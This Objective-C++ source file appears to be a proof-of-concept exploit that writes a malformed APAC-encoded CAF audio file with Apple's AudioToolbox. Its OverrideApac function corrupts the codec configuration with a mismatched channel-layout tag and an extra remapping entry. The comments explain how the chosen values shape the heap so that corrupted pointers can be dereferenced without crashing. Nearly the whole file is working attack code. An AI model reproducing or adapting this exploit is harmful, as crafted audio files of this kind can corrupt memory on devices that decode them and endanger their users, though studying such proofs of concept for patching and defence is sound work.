@import AVFAudio;
@import AudioToolbox;

#include <vector>

struct CodecConfig {
  char padding0[0x78];                         // 0
  AudioChannelLayout* remappingChannelLayout;  // 0x78
  char padding1[0xe0 - 0x80];                  // 0x80
  std::vector<char> mRemappingArray;           // 0xe0
};

void OverrideApac(CodecConfig* config) {
  //the exact tag given here is extremely important.
  //The difference between the tag given here and the channelnum influences the heap layout.
  //With these exact values, it almost always ends up such that the 13th pointer in the permuted input vector
  //is the same address as the tenth one (i am not sure why yet, but the object that is there just happens to have that pointer as its first field perhaps). 
  // This makes it so when the pointers are later dereferenced, there is no segfault.
  //If you pick, for example, 13 and then 10 as the channelnum, it will segfault much earlier.
  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 13;
  config->mRemappingArray.push_back(0x3);
}

int main() {
    uint32_t channelNum = 12;
    AVAudioChannelLayout* channelLayout =
        [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | channelNum];

    AVAudioFormat* formatIn = [[AVAudioFormat alloc] initWithCommonFormat:AVAudioPCMFormatInt32
                                                              sampleRate:44100
                                                             interleaved:YES
                                                            channelLayout:channelLayout];

    AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                  .mFormatID = kAudioFormatAPAC,
                                                  .mFormatFlags = 0,
                                                  .mBytesPerPacket = 0,
                                                  .mFramesPerPacket = 0,
                                                  .mBytesPerFrame = 0,
                                                  .mChannelsPerFrame = channelNum,
                                                  .mBitsPerChannel = 0,
                                                  .mReserved = 0};


    NSURL* outUrl = [NSURL fileURLWithPath:@"output.caf"];

    OSStatus status = 0;

    ExtAudioFileRef audioFile = nullptr;
    status =
        ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileCAFType, &outputDescription,
                                  channelLayout.layout, kAudioFileFlags_EraseFile, &audioFile);
    if (status) {
        fprintf(stderr, "error ExtAudioFileCreateWithURL: %d\n", status);
        return 1;
    }

    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                     sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
    if (status) {
        fprintf(stderr, "error ExtAudioFileSetProperty: %d\n", status);
        return 1;
    }
    status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                     sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
    if (status) {
        fprintf(stderr, "error ExtAudioFileSetProperty: %d\n", status);
        return 1;
    }

    const int frameCount = 44100;
    const int bufferSize = 44100 * channelNum;
    int* audioBuffer = new int[bufferSize]();

    for (int frame = 0; frame < frameCount; frame++) {
        for (int ch = 0; ch < channelNum; ch++) {
            audioBuffer[frame * channelNum + ch] = 0xff; 
        }
    }


    AudioBufferList audioBufferList{
        .mNumberBuffers = 1,
        .mBuffers =
            {
                {
                    .mNumberChannels = channelNum,
                    .mDataByteSize = static_cast<UInt32>(bufferSize * sizeof(int)),
                    .mData = audioBuffer,
                },
            },
    };
    
    status = ExtAudioFileWrite(audioFile, frameCount, &audioBufferList);
    if (status) {
        fprintf(stderr, "error ExtAudioFileWrite: %d\n", status);
        delete[] audioBuffer;
        return 1;
    }
    
    status = ExtAudioFileDispose(audioFile);
    if (status) {
        fprintf(stderr, "error ExtAudioFileDispose: %d\n", status);
    }
    
    delete[] audioBuffer;
    audioFile = nullptr;
    return 0;
}
